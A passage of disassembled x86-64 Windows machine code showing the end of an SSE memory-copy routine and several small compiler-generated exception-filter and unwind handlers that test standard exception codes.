   14000e689:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   14000e68e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000e695:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   14000e69c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000e6a3:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000e6aa:	73 94                	jae    0x14000e640
   14000e6ac:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000e6b0:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000e6b4:	4d 8b d9             	mov    %r9,%r11
   14000e6b7:	49 c1 eb 04          	shr    $0x4,%r11
   14000e6bb:	47 8b 9c 9a a8 6a 01 	mov    0x16aa8(%r10,%r11,4),%r11d
   14000e6c2:	00 
   14000e6c3:	4d 03 da             	add    %r10,%r11
   14000e6c6:	41 ff e3             	jmp    *%r11
   14000e6c9:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   14000e6d0:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   14000e6d7:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   14000e6de:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   14000e6e5:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   14000e6ec:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   14000e6f3:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   14000e6fa:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   14000e701:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   14000e708:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   14000e70f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   14000e716:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   14000e71d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   14000e724:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   14000e72b:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   14000e732:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000e736:	c3                   	ret
   14000e737:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000e73e:	00 00 
   14000e740:	0f 10 12             	movups (%rdx),%xmm2
   14000e743:	48 2b d1             	sub    %rcx,%rdx
   14000e746:	49 03 c8             	add    %r8,%rcx
   14000e749:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000e74e:	48 83 e9 10          	sub    $0x10,%rcx
   14000e752:	49 83 e8 10          	sub    $0x10,%r8
   14000e756:	f6 c1 0f             	test   $0xf,%cl
   14000e759:	74 18                	je     0x14000e773
   14000e75b:	4c 8b c9             	mov    %rcx,%r9
   14000e75e:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000e762:	0f 10 c8             	movups %xmm0,%xmm1
   14000e765:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000e769:	41 0f 11 09          	movups %xmm1,(%r9)
   14000e76d:	4c 8b c1             	mov    %rcx,%r8
   14000e770:	4c 2b c0             	sub    %rax,%r8
   14000e773:	4d 8b c8             	mov    %r8,%r9
   14000e776:	49 c1 e9 07          	shr    $0x7,%r9
   14000e77a:	74 71                	je     0x14000e7ed
   14000e77c:	0f 29 01             	movaps %xmm0,(%rcx)
   14000e77f:	eb 16                	jmp    0x14000e797
   14000e781:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000e788:	0f 1f 84 00 00 00 00 
   14000e78f:	00 
   14000e790:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000e794:	0f 29 09             	movaps %xmm1,(%rcx)
   14000e797:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000e79c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   14000e7a1:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   14000e7a8:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000e7ac:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   14000e7b0:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   14000e7b5:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000e7ba:	49 ff c9             	dec    %r9
   14000e7bd:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   14000e7c1:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   14000e7c5:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   14000e7ca:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   14000e7cf:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   14000e7d3:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   14000e7d7:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000e7dc:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   14000e7e0:	75 ae                	jne    0x14000e790
   14000e7e2:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000e7e6:	49 83 e0 7f          	and    $0x7f,%r8
   14000e7ea:	0f 28 c1             	movaps %xmm1,%xmm0
   14000e7ed:	4d 8b c8             	mov    %r8,%r9
   14000e7f0:	49 c1 e9 04          	shr    $0x4,%r9
   14000e7f4:	74 1a                	je     0x14000e810
   14000e7f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e7fd:	00 00 00 
   14000e800:	0f 11 01             	movups %xmm0,(%rcx)
   14000e803:	48 83 e9 10          	sub    $0x10,%rcx
   14000e807:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000e80b:	49 ff c9             	dec    %r9
   14000e80e:	75 f0                	jne    0x14000e800
   14000e810:	49 83 e0 0f          	and    $0xf,%r8
   14000e814:	74 03                	je     0x14000e819
   14000e816:	0f 11 10             	movups %xmm2,(%rax)
   14000e819:	0f 11 01             	movups %xmm0,(%rcx)
   14000e81c:	c3                   	ret
   14000e81d:	cc                   	int3
   14000e81e:	cc                   	int3
   14000e81f:	cc                   	int3
   14000e820:	cc                   	int3
   14000e821:	cc                   	int3
   14000e822:	cc                   	int3
   14000e823:	cc                   	int3
   14000e824:	cc                   	int3
   14000e825:	cc                   	int3
   14000e826:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e82d:	00 00 00 
   14000e830:	40 55                	rex push %rbp
   14000e832:	48 83 ec 20          	sub    $0x20,%rsp
   14000e836:	48 8b ea             	mov    %rdx,%rbp
   14000e839:	48 8b 01             	mov    (%rcx),%rax
   14000e83c:	48 8b d1             	mov    %rcx,%rdx
   14000e83f:	8b 08                	mov    (%rax),%ecx
   14000e841:	e8 8a 69 ff ff       	call   0x1400051d0
   14000e846:	90                   	nop
   14000e847:	48 83 c4 20          	add    $0x20,%rsp
   14000e84b:	5d                   	pop    %rbp
   14000e84c:	c3                   	ret
   14000e84d:	cc                   	int3
   14000e84e:	40 55                	rex push %rbp
   14000e850:	48 8b ea             	mov    %rdx,%rbp
   14000e853:	48 8b 01             	mov    (%rcx),%rax
   14000e856:	33 c9                	xor    %ecx,%ecx
   14000e858:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000e85e:	0f 94 c1             	sete   %cl
   14000e861:	8b c1                	mov    %ecx,%eax
   14000e863:	5d                   	pop    %rbp
   14000e864:	c3                   	ret
   14000e865:	cc                   	int3
   14000e866:	40 53                	rex push %rbx
   14000e868:	55                   	push   %rbp
   14000e869:	48 83 ec 28          	sub    $0x28,%rsp
   14000e86d:	48 8b ea             	mov    %rdx,%rbp
   14000e870:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   14000e874:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000e878:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000e87c:	74 6c                	je     0x14000e8ea
   14000e87e:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e882:	48 8b 08             	mov    (%rax),%rcx
   14000e885:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000e889:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e88d:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000e893:	75 55                	jne    0x14000e8ea
   14000e895:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e899:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000e89d:	75 4b                	jne    0x14000e8ea
   14000e89f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8a3:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000e8aa:	74 1a                	je     0x14000e8c6
   14000e8ac:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8b0:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000e8b7:	74 0d                	je     0x14000e8c6
   14000e8b9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8bd:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000e8c4:	75 24                	jne    0x14000e8ea
   14000e8c6:	e8 41 36 ff ff       	call   0x140001f0c
   14000e8cb:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000e8cf:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000e8d3:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e8d7:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000e8db:	e8 2c 36 ff ff       	call   0x140001f0c
   14000e8e0:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000e8e4:	e8 f7 7b ff ff       	call   0x1400064e0
   14000e8e9:	90                   	nop
   14000e8ea:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000e8f1:	8b 45 20             	mov    0x20(%rbp),%eax
   14000e8f4:	48 83 c4 28          	add    $0x28,%rsp
   14000e8f8:	5d                   	pop    %rbp
   14000e8f9:	5b                   	pop    %rbx
   14000e8fa:	c3                   	ret
   14000e8fb:	cc                   	int3
   14000e8fc:	40 53                	rex push %rbx
   14000e8fe:	55                   	push   %rbp
   14000e8ff:	57                   	push   %rdi
   14000e900:	48 83 ec 40          	sub    $0x40,%rsp
   14000e904:	48 8b ea             	mov    %rdx,%rbp
   14000e907:	48 89 4d 50          	mov    %rcx,0x50(%rbp)
   14000e90b:	48 89 4d 48          	mov    %rcx,0x48(%rbp)
   14000e90f:	e8 f8 35 ff ff       	call   0x140001f0c
   14000e914:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   14000e91b:	48 89 48 70          	mov    %rcx,0x70(%rax)
   14000e91f:	48 8b bd 98 00 00 00 	mov    0x98(%rbp),%rdi
   14000e926:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000e92a:	e8 dd 35 ff ff       	call   0x140001f0c
   14000e92f:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000e933:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000e937:	48 8b 08             	mov    (%rax),%rcx
   14000e93a:	48 8b 59 38          	mov    0x38(%rcx),%rbx
   14000e93e:	e8 c9 35 ff ff       	call   0x140001f0c
   14000e943:	48 89 58 68          	mov    %rbx,0x68(%rax)
   14000e947:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000e94b:	c6 44 24 38 01       	movb   $0x1,0x38(%rsp)
   14000e950:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000e956:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000e95b:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   14000e962:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000e967:	4c 8b cf             	mov    %rdi,%r9
   14000e96a:	4c 8b 85 90 00 00 00 	mov    0x90(%rbp),%r8
   14000e971:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   14000e978:	48 8b 09             	mov    (%rcx),%rcx
   14000e97b:	e8 58 4f ff ff       	call   0x1400038d8
   14000e980:	e8 87 35 ff ff       	call   0x140001f0c
   14000e985:	48 83 60 70 00       	andq   $0x0,0x70(%rax)
   14000e98a:	c7 45 40 01 00 00 00 	movl   $0x1,0x40(%rbp)
   14000e991:	b8 01 00 00 00       	mov    $0x1,%eax
   14000e996:	48 83 c4 40          	add    $0x40,%rsp
   14000e99a:	5f                   	pop    %rdi
   14000e99b:	5d                   	pop    %rbp
   14000e99c:	5b                   	pop    %rbx
   14000e99d:	c3                   	ret
   14000e99e:	cc                   	int3
   14000e99f:	40 55                	rex push %rbp
   14000e9a1:	48 83 ec 20          	sub    $0x20,%rsp
   14000e9a5:	48 8b ea             	mov    %rdx,%rbp
   14000e9a8:	48 89 4d 58          	mov    %rcx,0x58(%rbp)
   14000e9ac:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   14000e9b0:	48 8b 95 b8 00 00 00 	mov    0xb8(%rbp),%rdx
   14000e9b7:	e8 f8 51 ff ff       	call   0x140003bb4
   14000e9bc:	90                   	nop
   14000e9bd:	48 83 c4 20          	add    $0x20,%rsp
   14000e9c1:	5d                   	pop    %rbp
   14000e9c2:	c3                   	ret
   14000e9c3:	cc                   	int3
   14000e9c4:	40 53                	rex push %rbx
   14000e9c6:	55                   	push   %rbp
   14000e9c7:	48 83 ec 28          	sub    $0x28,%rsp
   14000e9cb:	48 8b ea             	mov    %rdx,%rbp
   14000e9ce:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000e9d2:	e8 69 3e ff ff       	call   0x140002840
   14000e9d7:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   14000e9db:	75 48                	jne    0x14000ea25
   14000e9dd:	48 8b 9d b8 00 00 00 	mov    0xb8(%rbp),%rbx
   14000e9e4:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000e9ea:	75 39                	jne    0x14000ea25
   14000e9ec:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000e9f0:	75 33                	jne    0x14000ea25
   14000e9f2:	81 7b 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rbx)
   14000e9f9:	74 12                	je     0x14000ea0d
   14000e9fb:	81 7b 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rbx)
   14000ea02:	74 09                	je     0x14000ea0d
   14000ea04:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   14000ea0b:	75 18                	jne    0x14000ea25
   14000ea0d:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000ea11:	e8 42 33 ff ff       	call   0x140001d58
   14000ea16:	85 c0                	test   %eax,%eax
   14000ea18:	74 0b                	je     0x14000ea25
   14000ea1a:	b2 01                	mov    $0x1,%dl
   14000ea1c:	48 8b cb             	mov    %rbx,%rcx
   14000ea1f:	e8 c0 32 ff ff       	call   0x140001ce4
   14000ea24:	90                   	nop
   14000ea25:	e8 e2 34 ff ff       	call   0x140001f0c
   14000ea2a:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   14000ea31:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000ea35:	e8 d2 34 ff ff       	call   0x140001f0c
   14000ea3a:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000ea3e:	48 89 48 28          	mov    %rcx,0x28(%rax)
   14000ea42:	48 83 c4 28          	add    $0x28,%rsp
   14000ea46:	5d                   	pop    %rbp
   14000ea47:	5b                   	pop    %rbx
   14000ea48:	c3                   	ret
   14000ea49:	cc                   	int3
   14000ea4a:	40 55                	rex push %rbp
   14000ea4c:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea50:	48 8b ea             	mov    %rdx,%rbp
   14000ea53:	e8 54 33 ff ff       	call   0x140001dac
   14000ea58:	90                   	nop
   14000ea59:	48 83 c4 20          	add    $0x20,%rsp
   14000ea5d:	5d                   	pop    %rbp
   14000ea5e:	c3                   	ret
   14000ea5f:	cc                   	int3
   14000ea60:	40 55                	rex push %rbp
   14000ea62:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea66:	48 8b ea             	mov    %rdx,%rbp
   14000ea69:	e8 9e 34 ff ff       	call   0x140001f0c
   14000ea6e:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   14000ea72:	7e 08                	jle    0x14000ea7c
   14000ea74:	e8 93 34 ff ff       	call   0x140001f0c
   14000ea79:	ff 48 30             	decl   0x30(%rax)
   14000ea7c:	48 83 c4 20          	add    $0x20,%rsp
   14000ea80:	5d                   	pop    %rbp
   14000ea81:	c3                   	ret
   14000ea82:	cc                   	int3
   14000ea83:	40 55                	rex push %rbp
   14000ea85:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea89:	48 8b ea             	mov    %rdx,%rbp
   14000ea8c:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000ea90:	8b 08                	mov    (%rax),%ecx
   14000ea92:	48 83 c4 20          	add    $0x20,%rsp
   14000ea96:	5d                   	pop    %rbp
   14000ea97:	e9 60 9e ff ff       	jmp    0x1400088fc
   14000ea9c:	cc                   	int3
   14000ea9d:	40 55                	rex push %rbp
   14000ea9f:	48 83 ec 20          	sub    $0x20,%rsp
   14000eaa3:	48 8b ea             	mov    %rdx,%rbp
   14000eaa6:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000eaaa:	48 8b 01             	mov    (%rcx),%rax
   14000eaad:	8b 08                	mov    (%rax),%ecx
   14000eaaf:	89 4d 24             	mov    %ecx,0x24(%rbp)
   14000eab2:	33 c0                	xor    %eax,%eax
   14000eab4:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   14000eaba:	0f 94 c0             	sete   %al
   14000eabd:	89 45 20             	mov    %eax,0x20(%rbp)
   14000eac0:	8b 45 20             	mov    0x20(%rbp),%eax
   14000eac3:	48 83 c4 20          	add    $0x20,%rsp
   14000eac7:	5d                   	pop    %rbp
   14000eac8:	c3                   	ret
   14000eac9:	cc                   	int3
   14000eaca:	40 55                	rex push %rbp
   14000eacc:	48 83 ec 20          	sub    $0x20,%rsp
   14000ead0:	48 8b ea             	mov    %rdx,%rbp
   14000ead3:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000ead7:	8b 08                	mov    (%rax),%ecx
   14000ead9:	48 83 c4 20          	add    $0x20,%rsp
   14000eadd:	5d                   	pop    %rbp
   14000eade:	e9 19 9e ff ff       	jmp    0x1400088fc
   14000eae3:	cc                   	int3
   14000eae4:	40 55                	rex push %rbp
   14000eae6:	48 83 ec 20          	sub    $0x20,%rsp
   14000eaea:	48 8b ea             	mov    %rdx,%rbp
   14000eaed:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000eaf1:	8b 08                	mov    (%rax),%ecx
   14000eaf3:	48 83 c4 20          	add    $0x20,%rsp
   14000eaf7:	5d                   	pop    %rbp
   14000eaf8:	e9 ff 9d ff ff       	jmp    0x1400088fc
   14000eafd:	cc                   	int3
   14000eafe:	40 55                	rex push %rbp
   14000eb00:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb04:	48 8b ea             	mov    %rdx,%rbp
   14000eb07:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000eb0c:	48 83 c4 20          	add    $0x20,%rsp
   14000eb10:	5d                   	pop    %rbp
   14000eb11:	e9 e6 9d ff ff       	jmp    0x1400088fc
   14000eb16:	cc                   	int3
   14000eb17:	40 55                	rex push %rbp
   14000eb19:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb1d:	48 8b ea             	mov    %rdx,%rbp
   14000eb20:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000eb25:	48 83 c4 20          	add    $0x20,%rsp
   14000eb29:	5d                   	pop    %rbp
   14000eb2a:	e9 cd 9d ff ff       	jmp    0x1400088fc
   14000eb2f:	cc                   	int3
   14000eb30:	40 55                	rex push %rbp
   14000eb32:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb36:	48 8b ea             	mov    %rdx,%rbp
   14000eb39:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000eb3e:	48 83 c4 20          	add    $0x20,%rsp
   14000eb42:	5d                   	pop    %rbp
   14000eb43:	e9 b4 9d ff ff       	jmp    0x1400088fc
   14000eb48:	cc                   	int3
   14000eb49:	40 55                	rex push %rbp
   14000eb4b:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb4f:	48 8b ea             	mov    %rdx,%rbp
   14000eb52:	33 c9                	xor    %ecx,%ecx
   14000eb54:	48 83 c4 20          	add    $0x20,%rsp
   14000eb58:	5d                   	pop    %rbp
   14000eb59:	e9 9e 9d ff ff       	jmp    0x1400088fc
   14000eb5e:	cc                   	int3
   14000eb5f:	40 55                	rex push %rbp
   14000eb61:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb65:	48 8b ea             	mov    %rdx,%rbp
   14000eb68:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000eb6c:	74 0b                	je     0x14000eb79
   14000eb6e:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000eb73:	e8 84 9d ff ff       	call   0x1400088fc
   14000eb78:	90                   	nop
   14000eb79:	48 83 c4 20          	add    $0x20,%rsp
   14000eb7d:	5d                   	pop    %rbp
   14000eb7e:	c3                   	ret
   14000eb7f:	cc                   	int3
   14000eb80:	40 55                	rex push %rbp
   14000eb82:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb86:	48 8b ea             	mov    %rdx,%rbp
   14000eb89:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000eb8d:	48 8b 09             	mov    (%rcx),%rcx
   14000eb90:	48 83 c4 20          	add    $0x20,%rsp
   14000eb94:	5d                   	pop    %rbp
   14000eb95:	e9 c2 ba ff ff       	jmp    0x14000a65c
   14000eb9a:	cc                   	int3
   14000eb9b:	40 55                	rex push %rbp
   14000eb9d:	48 83 ec 20          	sub    $0x20,%rsp
   14000eba1:	48 8b ea             	mov    %rdx,%rbp
   14000eba4:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   14000ebab:	8b 08                	mov    (%rax),%ecx
   14000ebad:	48 83 c4 20          	add    $0x20,%rsp
   14000ebb1:	5d                   	pop    %rbp
   14000ebb2:	e9 45 9d ff ff       	jmp    0x1400088fc
   14000ebb7:	cc                   	int3
   14000ebb8:	40 55                	rex push %rbp
   14000ebba:	48 83 ec 20          	sub    $0x20,%rsp
   14000ebbe:	48 8b ea             	mov    %rdx,%rbp
   14000ebc1:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000ebc5:	8b 08                	mov    (%rax),%ecx
   14000ebc7:	48 83 c4 20          	add    $0x20,%rsp
   14000ebcb:	5d                   	pop    %rbp
   14000ebcc:	e9 4b 9f ff ff       	jmp    0x140008b1c
   14000ebd1:	cc                   	int3
   14000ebd2:	40 55                	rex push %rbp
   14000ebd4:	48 83 ec 30          	sub    $0x30,%rsp
   14000ebd8:	48 8b ea             	mov    %rdx,%rbp
   14000ebdb:	8b 4d 60             	mov    0x60(%rbp),%ecx
   14000ebde:	48 83 c4 30          	add    $0x30,%rsp
   14000ebe2:	5d                   	pop    %rbp
   14000ebe3:	e9 34 9f ff ff       	jmp    0x140008b1c
   14000ebe8:	cc                   	int3
   14000ebe9:	40 55                	rex push %rbp
   14000ebeb:	48 83 ec 20          	sub    $0x20,%rsp
   14000ebef:	48 8b ea             	mov    %rdx,%rbp
   14000ebf2:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000ebf7:	48 83 c4 20          	add    $0x20,%rsp
   14000ebfb:	5d                   	pop    %rbp
   14000ebfc:	e9 fb 9c ff ff       	jmp    0x1400088fc
   14000ec01:	cc                   	int3
   14000ec02:	40 55                	rex push %rbp
   14000ec04:	48 83 ec 30          	sub    $0x30,%rsp
   14000ec08:	48 8b ea             	mov    %rdx,%rbp
   14000ec0b:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000ec0f:	48 83 c4 30          	add    $0x30,%rsp
   14000ec13:	5d                   	pop    %rbp
   14000ec14:	e9 43 ba ff ff       	jmp    0x14000a65c
   14000ec19:	cc                   	int3
   14000ec1a:	40 55                	rex push %rbp
   14000ec1c:	48 83 ec 20          	sub    $0x20,%rsp
   14000ec20:	48 8b ea             	mov    %rdx,%rbp
   14000ec23:	48 8b 01             	mov    (%rcx),%rax
   14000ec26:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000ec2c:	74 0c                	je     0x14000ec3a
   14000ec2e:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000ec34:	74 04                	je     0x14000ec3a
   14000ec36:	33 c0                	xor    %eax,%eax
   14000ec38:	eb 05                	jmp    0x14000ec3f
   14000ec3a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ec3f:	48 83 c4 20          	add    $0x20,%rsp
   14000ec43:	5d                   	pop    %rbp
   14000ec44:	c3                   	ret
   14000ec45:	cc                   	int3
   14000ec46:	cc                   	int3
   14000ec47:	cc                   	int3
   14000ec48:	cc                   	int3
   14000ec49:	cc                   	int3
   14000ec4a:	cc                   	int3
   14000ec4b:	cc                   	int3
   14000ec4c:	cc                   	int3
   14000ec4d:	cc                   	int3
   14000ec4e:	cc                   	int3
   14000ec4f:	cc                   	int3
   14000ec50:	40 55                	rex push %rbp
   14000ec52:	48 83 ec 20          	sub    $0x20,%rsp
   14000ec56:	48 8b ea             	mov    %rdx,%rbp
   14000ec59:	48 8b 01             	mov    (%rcx),%rax
   14000ec5c:	33 c9                	xor    %ecx,%ecx
   14000ec5e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000ec64:	0f 94 c1             	sete   %cl
   14000ec67:	8b c1                	mov    %ecx,%eax
   14000ec69:	48 83 c4 20          	add    $0x20,%rsp
   14000ec6d:	5d                   	pop    %rbp
   14000ec6e:	c3                   	ret
   14000ec6f:	cc                   	int3
